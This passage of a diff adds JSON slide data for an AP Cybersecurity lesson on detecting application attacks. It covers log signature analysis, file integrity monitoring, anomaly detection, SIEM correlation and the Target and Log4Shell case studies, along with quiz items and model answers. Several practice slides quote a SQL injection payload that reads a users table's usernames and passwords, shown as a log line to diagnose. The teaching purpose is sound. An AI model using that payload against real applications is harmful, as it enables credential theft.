+    "<p>Section IV translated the chapter's case-study lessons into four concrete hardening controls: immutable centralized retention, layered detection mechanisms, tuned alerting with enforced escalation, and disciplined baseline re-certification. Together they form a program-level answer to both failure modes examined in Section III, Target's process breakdown and Log4Shell's retention dependency.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.1",
+   "parent_n": 27,
+   "title": "Exam Decision Rule: Matching Evidence to Control",
+   "slide_type": "deep_question",
+   "difficulty": "advanced",
+   "tags": [
+    "exam-focus",
+    "decision-rule",
+    "synthesis"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This decision rule is a direct restatement of the chapter's own Exam Focus callout -- treat it as the single most exam-actionable slide in the deck.</p><p><b>Misconception:</b> Trying to force every scenario into a single control. Some scenarios legitimately require citing two or all three.</p><p><b>Analogy:</b> A doctor differentially diagnosing symptoms -- match the specific evidence pattern to the specific test that would reveal it.</p><p><b>Exam tip:</b> Practice this decision rule against the SQLi log line, the AIDE web-shell output, and the correlation rule from earlier slides until it's automatic.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Malicious string in a request:</b> Answer is log/signature analysis",
+    "<b>File on disk changed/added/modified with no change ticket:</b> Answer is FIM",
+    "<b>Volume, timing, or geographic pattern unusual for a specific user/system, no obvious string or file change:</b> Answer is anomaly detection / behavioral baselining",
+    "<b>Many scenarios require naming more than one control</b>",
+    "<b>Practice habit:</b> Before answering, identify exactly which category of evidence the prompt describes"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.1",
+   "parent_n": 27,
+   "title": "Exam Decision Rule: Matching Evidence to Control",
+   "slide_type": "deep_question",
+   "difficulty": "advanced",
+   "tags": [
+    "exam-focus",
+    "decision-rule",
+    "synthesis"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This decision rule is a direct restatement of the chapter's own Exam Focus callout -- treat it as the single most exam-actionable slide in the deck.</p><p><b>Misconception:</b> Trying to force every scenario into a single control. Some scenarios legitimately require citing two or all three.</p><p><b>Analogy:</b> A doctor differentially diagnosing symptoms -- match the specific evidence pattern to the specific test that would reveal it.</p><p><b>Exam tip:</b> Practice this decision rule against the SQLi log line, the AIDE web-shell output, and the correlation rule from earlier slides until it's automatic.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>The exam frequently gives a scenario and asks which control would have detected it. Use this decision rule: if the scenario describes a recognizable malicious string in a request, the answer is log/signature analysis. If it describes a file on disk that changed, was added, or was modified without a change ticket, the answer is FIM. If it describes a volume, timing, or geographic pattern that is unusual for a specific user or system but contains no obviously malicious string or file change, the answer is anomaly detection/behavioral baselining. Many scenarios require you to name more than one.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.2",
+   "parent_n": 28,
+   "title": "Practice: Diagnose This Log Line",
+   "slide_type": "practice",
+   "difficulty": "standard",
+   "tags": [
+    "practice",
+    "sqli",
+    "frq-practice"
+   ],
+   "quiz": {
+    "type": "FRQ",
+    "question": "A web server access log shows a request with status 200 containing the string ' UNION SELECT username,password,3 FROM users-- in a query parameter, sent by a client with User-Agent 'sqlmap/1.7.2.' Explain what this evidence indicates, why the 200 status code is significant, and what additional log sources or controls an analyst should correlate against to determine impact.",
+    "prompt": "Address: (a) attack type and its signature elements; (b) significance of status 200; (c) at least three additional sources/controls to correlate against.",
+    "explanation": "Full-credit response: (a) UNION-based SQL injection, evidenced by SQL keywords (UNION, SELECT), the -- comment terminator, and the sqlmap User-Agent identifying an automated exploitation tool. (b) Status 200 indicates the request was processed rather than blocked by a WAF/input validation layer, suggesting the payload may have bypassed defenses -- elevating this from attempted-and-blocked to potential successful exploitation. (c) Correlate against: database audit logs (did the query execute and what was returned), FIM alerts on the web app directory (was a web shell dropped as a follow-on), subsequent activity from the same source IP (escalation toward exfiltration), and SIEM correlation rules tying this to other indicators (unusual outbound volume, new accounts, additional injection attempts)."
+   },
+   "speaker_notes": "<p><b>Context:</b> This practice slide models the exact self-check review question from the chapter -- work through it before checking the model answer.</p><p><b>Misconception:</b> Stopping the analysis at 'this is SQLi.' Full credit requires explaining the significance of the status code and naming correlated evidence sources.</p><p><b>Analogy:</b> A single clue at a crime scene starts the investigation; it doesn't close the case by itself.</p><p><b>Exam tip:</b> FRQ answers on log-line diagnosis should always include (1) attack identification, (2) status-code interpretation, (3) named correlated evidence sources.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Given:</b> A log entry showing status 200, a query parameter containing <code>' UNION SELECT username,password,3 FROM users--</code>, User-Agent sqlmap",
+    "<b>Step 1:</b> Identify the attack type from the payload structure",
+    "<b>Step 2:</b> Explain why status 200 changes the severity assessment",
+    "<b>Step 3:</b> Name the additional log sources/controls needed to determine actual impact",
+    "<b>Model answer components:</b> UNION-based SQLi; 200 means processed not blocked; correlate with DB audit logs, FIM, and subsequent traffic from the same IP"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.2",
+   "parent_n": 28,
+   "title": "Practice: Diagnose This Log Line",
+   "slide_type": "practice",
+   "difficulty": "standard",
+   "tags": [
+    "practice",
+    "sqli",
+    "frq-practice"
+   ],
+   "quiz": {
+    "type": "FRQ",
+    "question": "A web server access log shows a request with status 200 containing the string ' UNION SELECT username,password,3 FROM users-- in a query parameter, sent by a client with User-Agent 'sqlmap/1.7.2.' Explain what this evidence indicates, why the 200 status code is significant, and what additional log sources or controls an analyst should correlate against to determine impact.",
+    "prompt": "Address: (a) attack type and its signature elements; (b) significance of status 200; (c) at least three additional sources/controls to correlate against.",
+    "explanation": "Full-credit response: (a) UNION-based SQL injection, evidenced by SQL keywords (UNION, SELECT), the -- comment terminator, and the sqlmap User-Agent identifying an automated exploitation tool. (b) Status 200 indicates the request was processed rather than blocked by a WAF/input validation layer, suggesting the payload may have bypassed defenses -- elevating this from attempted-and-blocked to potential successful exploitation. (c) Correlate against: database audit logs (did the query execute and what was returned), FIM alerts on the web app directory (was a web shell dropped as a follow-on), subsequent activity from the same source IP (escalation toward exfiltration), and SIEM correlation rules tying this to other indicators (unusual outbound volume, new accounts, additional injection attempts)."
+   },
+   "speaker_notes": "<p><b>Context:</b> This practice slide models the exact self-check review question from the chapter -- work through it before checking the model answer.</p><p><b>Misconception:</b> Stopping the analysis at 'this is SQLi.' Full credit requires explaining the significance of the status code and naming correlated evidence sources.</p><p><b>Analogy:</b> A single clue at a crime scene starts the investigation; it doesn't close the case by itself.</p><p><b>Exam tip:</b> FRQ answers on log-line diagnosis should always include (1) attack identification, (2) status-code interpretation, (3) named correlated evidence sources.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>This log line indicates an attempted UNION-based SQL injection attack, evidenced by SQL keywords, a comment terminator, and an automated-tool User-Agent. The HTTP 200 status is significant because it indicates the request was processed rather than rejected, elevating this from a blocked attempt to a potential successful exploitation requiring urgent investigation.</p>",
+    "<p>A complete analyst response correlates against: application-layer database audit logs (did the query actually execute and what was returned?), FIM alerts on the web app directory in the surrounding window (was a web shell dropped as a follow-on?), subsequent activity from the same source IP (did the attacker escalate toward exfiltration?), and SIEM correlation rules tying this event to other indicators.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.3",
+   "parent_n": 29,
+   "title": "Practice: Compare the Three Detection Mechanisms",
+   "slide_type": "practice",
+   "difficulty": "advanced",
+   "tags": [
+    "practice",
+    "comparison",
+    "frq-practice",
+    "synthesis"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This restates the chapter's second self-check review question -- a strong template for any FRQ asking you to compare/contrast the three mechanisms.</p><p><b>Misconception:</b> Ranking the three mechanisms as 'best to worst.' They are complementary, not competitive -- there is no universally superior single control.</p><p><b>Analogy:</b> Three specialists on a medical team, each trained to catch a different category of symptom that the others would overlook.</p><p><b>Exam tip:</b> Always frame comparison answers around 'complementary blind spots,' not a ranking.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Task:</b> For signature analysis, FIM, and anomaly detection, name one scenario each would catch that the other two would miss",
+    "<b>Signature analysis catches:</b> A documented, previously-seen malicious string pattern with low latency and low false positives",
+    "<b>FIM catches:</b> The downstream consequence of a compromise (e.g., a web shell dropped) regardless of exploitation technique used",
+    "<b>Anomaly detection catches:</b> Slow, low-and-slow attacks or insider credential misuse with no recognizable string or file change",
+    "<b>Synthesis point:</b> Each control's blind spot is a different control's strength, this is why all three are deployed and correlated together"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.3",
+   "parent_n": 29,
+   "title": "Practice: Compare the Three Detection Mechanisms",
+   "slide_type": "practice",
+   "difficulty": "advanced",
+   "tags": [
+    "practice",
+    "comparison",
+    "frq-practice",
+    "synthesis"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This restates the chapter's second self-check review question -- a strong template for any FRQ asking you to compare/contrast the three mechanisms.</p><p><b>Misconception:</b> Ranking the three mechanisms as 'best to worst.' They are complementary, not competitive -- there is no universally superior single control.</p><p><b>Analogy:</b> Three specialists on a medical team, each trained to catch a different category of symptom that the others would overlook.</p><p><b>Exam tip:</b> Always frame comparison answers around 'complementary blind spots,' not a ranking.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Signature-based log analysis excels at rapidly catching documented, previously-seen attack patterns, but is blind to novel payloads and to attacks involving no malicious string at all, such as authorized-insider abuse. FIM excels at catching the downstream consequence of a successful compromise regardless of exploitation technique, but would miss a pure data-exfiltration attack that reads data without modifying any monitored file, and only detects compromise after the file-level damage has occurred. Behavioral anomaly detection excels at catching slow, low-and-slow attacks and legitimate-credential misuse, but requires a mature, well-tuned baseline to avoid excess noise.</p>",
+    "<p>Because each control's blind spot is a different control's strength, a mature auditing program deploys and correlates all three within a SIEM rather than relying on any single approach.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.4",
+   "parent_n": 30,
+   "title": "Application: Building an Incident Timeline from Multiple Sources",
+   "slide_type": "application",
+   "difficulty": "advanced",
+   "tags": [
+    "application",
+    "incident-timeline",
+    "correlation",
+    "practice"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This exercise directly reuses the fim_and_webshell_correlation pseudo-rule from Section II as its scenario basis.</p><p><b>Misconception:</b> Treating the raw log line or the raw FIM alert as sufficient to escalate. The correlated alert is what should trigger the documented escalation action (isolate_host, page_oncall).</p><p><b>Analogy:</b> A detective assembling a timeline board from separately collected witness statements and physical evidence.</p><p><b>Exam tip:</b> Practice narrating a short timeline from raw evidence to synthesized alert to escalation action -- this integrates nearly every mechanism in the chapter.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Scenario setup:</b> An analyst has an access log entry, an AIDE FIM alert, and a SIEM correlation rule firing in the same 10-minute window",
+    "<b>Step 1:</b> Order the three evidentiary items chronologically",
+    "<b>Step 2:</b> Identify which item represents the initial exploitation attempt vs. the consequence vs. the synthesized alert",
+    "<b>Step 3:</b> Draft the escalation action based on the CRITICAL severity correlation rule pattern shown earlier",
+    "<b>Skill being practiced:</b> Reconstructing a coherent attack narrative from disparate raw evidence, the core SOC analyst task"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.4",
+   "parent_n": 30,
+   "title": "Application: Building an Incident Timeline from Multiple Sources",
+   "slide_type": "application",
+   "difficulty": "advanced",
+   "tags": [
+    "application",
+    "incident-timeline",
+    "correlation",
+    "practice"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This exercise directly reuses the fim_and_webshell_correlation pseudo-rule from Section II as its scenario basis.</p><p><b>Misconception:</b> Treating the raw log line or the raw FIM alert as sufficient to escalate. The correlated alert is what should trigger the documented escalation action (isolate_host, page_oncall).</p><p><b>Analogy:</b> A detective assembling a timeline board from separately collected witness statements and physical evidence.</p><p><b>Exam tip:</b> Practice narrating a short timeline from raw evidence to synthesized alert to escalation action -- this integrates nearly every mechanism in the chapter.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>This application exercise asks students to reconstruct a plausible attack timeline using the tools introduced across the chapter: an access log line showing an unusual PHP upload-directory request with status 200, an AIDE alert reporting a new file added to that same directory minutes later, and a SIEM correlation rule that fires because both conditions were met within its 10-minute window. Ordering these correctly, request first, file-drop second, correlated alert third, and explaining why the correlated alert is the actionable trigger (rather than either raw signal alone) is the core reconstruction skill a SOC analyst performs daily.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.5",
+   "parent_n": 31,
+   "title": "Synthesis: The Application Threat Auditing Kill Chain",
+   "slide_type": "deep_question",
+   "difficulty": "advanced",
+   "tags": [
+    "kill-chain",
+    "synthesis",
+    "detection-lifecycle"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is the chapter's single unifying synthesis -- every prior slide's content maps onto one step of this five-part chain.</p><p><b>Misconception:</b> Treating detection mechanisms and the response lifecycle as separate topics. They are one continuous chain -- a technically perfect detection with a broken lifecycle produces the same real-world outcome as no detection at all.</p><p><b>Analogy:</b> A relay race -- the fastest first three legs mean nothing if the anchor leg drops the baton.</p><p><b>Exam tip:</b> When an FRQ asks you to 'evaluate' an organization's security posture, walk this full five-step chain rather than evaluating only the technical tooling.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Step 1, Attempt leaves a fingerprint:</b> Injection payload appears verbatim in an access log before any blocking occurs",
+    "<b>Step 2, Consequence leaves a fingerprint:</b> If the attempt succeeds, a file changes on disk, caught by FIM against a trusted baseline",
+    "<b>Step 3, Pattern leaves a fingerprint:</b> If neither a known string nor a file change is present, behavioral deviation from baseline is the only remaining signal",
+    "<b>Step 4, Correlation elevates confidence:</b> A SIEM joins signals across sources/time to distinguish real incidents from isolated noise",
+    "<b>Step 5, The lifecycle must complete:</b> Detection -> triage -> escalation -> response, or the entire preceding chain (as in Target) accomplishes nothing"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.5",
+   "parent_n": 31,
+   "title": "Synthesis: The Application Threat Auditing Kill Chain",
+   "slide_type": "deep_question",
+   "difficulty": "advanced",
+   "tags": [
+    "kill-chain",
+    "synthesis",
+    "detection-lifecycle"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is the chapter's single unifying synthesis -- every prior slide's content maps onto one step of this five-part chain.</p><p><b>Misconception:</b> Treating detection mechanisms and the response lifecycle as separate topics. They are one continuous chain -- a technically perfect detection with a broken lifecycle produces the same real-world outcome as no detection at all.</p><p><b>Analogy:</b> A relay race -- the fastest first three legs mean nothing if the anchor leg drops the baton.</p><p><b>Exam tip:</b> When an FRQ asks you to 'evaluate' an organization's security posture, walk this full five-step chain rather than evaluating only the technical tooling.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Pulling every mechanism in this chapter together: an attacker's attempt leaves a literal fingerprint in access logs (Section II); if the attempt succeeds, the consequence leaves a fingerprint in file state, caught by FIM against a trusted baseline; if an attacker evades both by using no recognizable string and touching no monitored file, only behavioral deviation from an established baseline remains as a signal. A SIEM correlates these signals across sources and time to distinguish real incidents from isolated noise (Section II's FIM-plus-log rule).</p>",
+    "<p>But, as the Target case study proves, none of this technical chain matters unless the full detection-to-response lifecycle completes: detection, triage, escalation, and response. A break at any link, as Log4Shell's retention dependency and Target's escalation failure both separately demonstrate, renders the earlier, correctly-functioning links worthless in terms of actual defensive outcome.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.5",
+   "parent_n": 31,
+   "title": "Synthesis: The Application Threat Auditing Kill Chain",
+   "slide_type": "deep_question",
+   "difficulty": "advanced",
+   "tags": [
+    "kill-chain",
+    "synthesis",
+    "detection-lifecycle"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is the chapter's single unifying synthesis -- every prior slide's content maps onto one step of this five-part chain.</p><p><b>Misconception:</b> Treating detection mechanisms and the response lifecycle as separate topics. They are one continuous chain -- a technically perfect detection with a broken lifecycle produces the same real-world outcome as no detection at all.</p><p><b>Analogy:</b> A relay race -- the fastest first three legs mean nothing if the anchor leg drops the baton.</p><p><b>Exam tip:</b> When an FRQ asks you to 'evaluate' an organization's security posture, walk this full five-step chain rather than evaluating only the technical tooling.</p>",
+   "beat": 3,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "auditing_kill_chain",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.6",
+   "parent_n": 32,
+   "title": "Exam-Readiness Checklist: Topic 5.6",
+   "slide_type": "practice",
+   "difficulty": "advanced",
+   "tags": [
+    "exam-readiness",
+    "checklist",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This checklist mirrors the chapter's own three self-check review questions plus the Exam Focus and Critical Concept callouts distributed throughout.</p><p><b>Misconception:</b> Treating this as a memorization list. Every item above is best verified by working through a scenario, not by reciting a definition.</p><p><b>Analogy:</b> A pilot's pre-flight checklist -- each item is a discrete, verifiable competency, not a vague feeling of readiness.</p><p><b>Exam tip:</b> Time-box yourself: pick any log line or case-study fact from this deck and explain it aloud in under 60 seconds without notes.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>[ ]</b> Can distinguish prevention from detection, and mitigation from auditing, in any scenario",
+    "<b>[ ]</b> Can read a raw access log line and identify SQLi vs. XSS signatures, including percent-encoded variants",
+    "<b>[ ]</b> Can explain why HTTP status code (200 vs 403) changes the severity of a log finding",
+    "<b>[ ]</b> Can explain FIM's mechanism (baseline hash, periodic verification) and name Tripwire/AIDE as tools",
+    "<b>[ ]</b> Can apply the evidence-to-control decision rule (string -> signature; file change -> FIM; pattern -> anomaly detection)",
+    "<b>[ ]</b> Can use the Target case study to argue detection capability != detection outcome",
+    "<b>[ ]</b> Can use Log4Shell to argue why log retention length matters for retroactive hunting",
+    "<b>[ ]</b> Can name all four Section IV hardening controls and tie each to the case-study failure it addresses",
+    "<b>[ ]</b> Can walk the full five-step auditing kill chain from attempt to response lifecycle"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.5.a.6",
+   "parent_n": 32,
+   "title": "Exam-Readiness Checklist: Topic 5.6",
+   "slide_type": "practice",
+   "difficulty": "advanced",
+   "tags": [
+    "exam-readiness",
+    "checklist",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This checklist mirrors the chapter's own three self-check review questions plus the Exam Focus and Critical Concept callouts distributed throughout.</p><p><b>Misconception:</b> Treating this as a memorization list. Every item above is best verified by working through a scenario, not by reciting a definition.</p><p><b>Analogy:</b> A pilot's pre-flight checklist -- each item is a discrete, verifiable competency, not a vague feeling of readiness.</p><p><b>Exam tip:</b> Time-box yourself: pick any log line or case-study fact from this deck and explain it aloud in under 60 seconds without notes.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Before moving on, verify fluency across this checklist. Topic 5.6 is tested less through rote definitions and more through applied scenario analysis, the exam will describe a log line, a file event, or an organizational failure and ask you to diagnose it using the frameworks built across this chapter. If any checklist item feels shaky, revisit the corresponding section: prevention/detection framing (Section I), technical mechanisms (Section II), the Target/Log4Shell case studies (Section III), or the hardening controls (Section IV).</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  }
+ ],
+ "classroom": {
+  "cover": {
+   "summary": "Noticing that an attack has happened. Hash verification and file integrity monitoring, log analysis for the signatures of application attacks, data loss prevention, and the harder question of whether a given detection method is worth what it costs.",
+   "footer": "5 learning objectives  ·  College Board AP Cybersecurity Course Framework",
+   "notes": "Cover slide for Topic 5.6: Detecting Attacks on Data and Applications. Noticing that an attack has happened. Hash verification and file integrity monitoring, log analysis for the signatures of application attacks, data loss prevention, and the harder question of whether a given detection method is worth what it costs."
+  },
+  "objectives": {
+   "items": [
+    {
+     "code": "5.6.A",
+     "skill": "Detect Attacks",
+     "text": "Explain how attacks against data are detected."
+    },
+    {
+     "code": "5.6.B",
+     "skill": "Detect Attacks",
+     "text": "Determine which controls will detect attacks directed at an application or its data."
+    },
+    {
+     "code": "5.6.C",
+     "skill": "Detect Attacks",
+     "text": "Evaluate what a given detection method actually delivers, against what it costs to run."
+    },
+    {
+     "code": "5.6.D",
+     "skill": "Detect Attacks",
+     "text": "Determine whether a file has been altered by verifying its hash against a trusted reference value."
+    },
+    {
+     "code": "5.6.E",
+     "skill": "Detect Attacks",
+     "text": "Apply detection techniques to log files in order to identify and report indicators of an application attack."
+    }
+   ],
+   "footer": "Objectives paraphrased from the AP Cybersecurity Course Framework (College Board, AP Career Kickstart).",
+   "notes": "Read each learning objective aloud and connect it to the exam skill category before starting the topic."
+  },
+  "concept_maps": [],
+  "big_idea": {
+   "text": "An application log is a security camera pointed at the cash register, not the front door. It won't stop a theft by itself — but it is often the only record of exactly how, and exactly when, one happened.",
+   "closing": "Hold onto this picture — we'll come back to it as the mechanics get more technical.",
+   "notes": "Big-idea framing for Topic 5.6. Open with this analogy before the mechanics: \"An application log is a security camera pointed at the cash register, not the front door. It won't stop a theft by itself — but it is often the only record of exactly how, and exactly when, one happened.\" Ask students for their own version of the analogy before moving on."
+  }
+ }
+}
